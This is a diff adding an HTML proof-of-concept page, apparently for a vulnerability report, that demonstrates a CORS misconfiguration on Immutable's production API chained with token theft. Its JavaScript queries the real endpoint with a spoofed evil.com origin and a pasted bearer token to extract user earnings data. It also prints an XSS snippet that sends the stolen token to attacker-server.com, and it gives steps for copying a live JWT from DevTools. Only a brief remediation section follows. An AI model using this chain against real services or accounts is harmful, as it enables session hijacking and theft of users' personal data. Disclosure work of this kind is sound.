@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+<head><title>Immutable CORS + Token Theft Exploit</title>
+<style>
+body { font-family: Arial, sans-serif; margin: 40px; max-width: 800px; }
+.section { border: 1px solid #ccc; padding: 20px; margin: 20px 0; border-radius: 5px; }
+h2 { color: #333; }
+button { padding: 10px 15px; margin: 5px; background: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; }
+button:hover { background: #45a049; }
+pre { background: #f5f5f5; padding: 10px; border-radius: 3px; overflow: auto; }
+.success { color: green; }
+.error { color: red; }
+.info { color: blue; }
+.step { margin: 15px 0; padding: 10px; border-left: 4px solid #4CAF50; background: #f9f9f9; }
+</style>
+</head>
+<body>
+<h1>Immutable CORS + Token Theft Exploit Demonstration</h1>
+<p>This PoC shows how an attacker can steal user data via CORS misconfiguration.</p>
+
+<div class="section">
+<h2>Step 1: Verify CORS Misconfiguration</h2>
+<div class="step">
+<p>Checking if <code>api.immutable.com</code> allows requests from any origin...</p>
+<button onclick="checkCORS()">Check CORS Headers</button>
+<pre id="corsResult">Click button to check</pre>
+</div>
+</div>
+
+<div class="section">
+<h2>Step 2: Simulate Token Theft via XSS</h2>
+<div class="step">
+<p><strong>Scenario</strong>: A XSS vulnerability on <code>play.immutable.com</code> allows token theft.</p>
+<p><strong>How</strong>: Malicious script reads <code>Authorization</code> headers or localStorage and sends token to attacker server.</p>
+<p><strong>Simulation</strong>: Enter a valid JWT token (copied from DevTools Network tab):</p>
+<textarea id="tokenInput" rows="3" cols="80" placeholder="Paste Authorization: Bearer token here..."></textarea><br>
+<button onclick="simulateTokenTheft()">Simulate Token Theft</button>
+<pre id="tokenTheftResult">Token will appear here after simulation</pre>
+</div>
+</div>
+
+<div class="section">
+<h2>Step 3: Steal User Data with Stolen Token</h2>
+<div class="step">
+<p>Using the stolen token to make cross-origin request to Immutable API:</p>
+<button onclick="stealUserData()">Steal User Earnings Data</button>
+<pre id="dataResult">User data will appear here</pre>
+</div>
+</div>
+
+<div class="section">
+<h2>Summary of Attack Chain</h2>
+<ol>
+<li><strong>Token Theft</strong>: Attacker obtains JWT token via XSS, malicious extension, or MITM</li>
+<li><strong>CORS Exploitation</strong>: Attacker makes cross-origin request to <code>api.immutable.com/v2/rewards/earnings</code></li>
+<li><strong>Data Extraction</strong>: API returns sensitive user data due to <code>access-control-allow-origin: *</code></li>
+<li><strong>Exfiltration</strong>: Attacker sends stolen data to their server</li>
+</ol>
+<p class="error"><strong>Impact</strong>: Personal user data (earnings, quests, gems) can be stolen by any website.</p>
+</div>
+
+<script>
+async function checkCORS() {
+    const result = document.getElementById('corsResult');
+    result.textContent = 'Testing...';
+    
+    try {
+        const response = await fetch('https://api.immutable.com/v2/rewards/earnings', {
+            method: 'OPTIONS',
+            headers: { 'Origin': 'https://evil.com' }
+        });
+        
+        const headers = `HTTP Status: ${response.status} ${response.statusText}\n\n`;
+        const corsHeaders = `access-control-allow-origin: ${response.headers.get('access-control-allow-origin')}\n`;
+        const exposeHeaders = `access-control-expose-headers: ${response.headers.get('access-control-expose-headers')}\n`;
+        const allowHeaders = `access-control-allow-headers: ${response.headers.get('access-control-allow-headers')}`;
+        
+        result.textContent = headers + corsHeaders + exposeHeaders + allowHeaders;
+        
+        if (response.headers.get('access-control-allow-origin') === '*') {
+            result.innerHTML += '\n\n<span class="error">✓ CRITICAL: CORS allows ANY origin (*)</span>';
+        }
+    } catch (error) {
+        result.textContent = 'Error: ' + error.message;
+    }
+}
+
+function simulateTokenTheft() {
+    const token = document.getElementById('tokenInput').value.trim();
+    const result = document.getElementById('tokenTheftResult');
+    
+    if (!token) {
+        result.innerHTML = '<span class="error">Please paste a token first.</span>';
+        return;
+    }
+    
+    // Simulate token being stolen via XSS
+    const simulatedXSS = `// Malicious script on play.immutable.com (XSS)
+// Steals Authorization header from fetch requests
+const stolenToken = '${token.substring(0, 50)}...';
+fetch('https://attacker-server.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({token: stolenToken})
+});`;
+    
+    result.innerHTML = `<span class="success">✓ Token stolen via simulated XSS!</span>\n\n`;
+    result.innerHTML += `<span class="info">Simulated XSS code that could steal token:</span>\n`;
+    result.innerHTML += `<pre>${simulatedXSS}</pre>`;
+    result.innerHTML += `<span class="info">Token obtained: ${token.substring(0, 30)}...</span>`;
+}
+
+async function stealUserData() {
+    const token = document.getElementById('tokenInput').value.trim();
+    const result = document.getElementById('dataResult');
+    
+    if (!token) {
+        result.innerHTML = '<span class="error">Please paste a token in Step 2 first.</span>';
+        return;
+    }
+    
+    result.textContent = 'Making cross-origin request with stolen token...';
+    
+    try {
+        const response = await fetch('https://api.immutable.com/v2/rewards/earnings', {
+            headers: {
+                'Authorization': 'Bearer ' + token,
+                'Origin': 'https://evil.com'
+            }
+        });
+        
+        const data = await response.json();
+        
+        let output = `HTTP Status: ${response.status} ${response.statusText}\n\n`;
+        output += `Stolen User Data (first 3 items):\n\n`;
+        
+        // Show first 3 items for brevity
+        data.slice(0, 3).forEach(item => {
+            output += `• ${item.quest_info?.name || 'Unknown'}: ${item.type} (${item.status})\n`;
+            if (item.metadata?.amount) output += `  Amount: ${item.metadata.amount} gems\n`;
+            if (item.granted_at) output += `  Date: ${item.granted_at.substring(0, 10)}\n`;
+            output += '\n';
+        });
+        
+        if (data.length > 3) {
+            output += `... and ${data.length - 3} more items\n`;
+        }
+        
+        result.textContent = output;
+        
+        if (response.status === 200) {
+            result.innerHTML += '\n<span class="error">✓ SUCCESS: User data stolen via cross-origin request!</span>';
+        }
+        
+    } catch (error) {
+        result.textContent = 'Error: ' + error.message;
+    }
+}
+</script>
+
+<div class="section">
+<h2>How to Reproduce with Real Data</h2>
+<ol>
+<li>Login to <code>play.immutable.com</code></li>
+<li>Open DevTools (F12) → Network tab</li>
+<li>Reload page, find a request to <code>api.immutable.com</code></li>
+<li>Click the request → Headers tab → find <code>Authorization: Bearer eyJ...</code></li>
+<li>Copy the token value (without "Bearer ")</li>
+<li>Paste token in Step 2 above</li>
+<li>Click buttons in sequence to see full attack chain</li>
+</ol>
+</div>
+
+<div class="section">
+<h2>Security Impact & Remediation</h2>
+<p><strong>Problem</strong>: <code>access-control-allow-origin: *</code> on authenticated endpoints</p>
+<p><strong>Fix</strong>: Restrict CORS to specific trusted origins only</p>
+<p><strong>Required Changes</strong>:</p>
+<pre># Bad (current)
+access-control-allow-origin: *
+
+# Good (fixed)
+access-control-allow-origin: https://play.immutable.com
+# or implement proper origin validation</pre>
+</div>
+</body>
+</html>
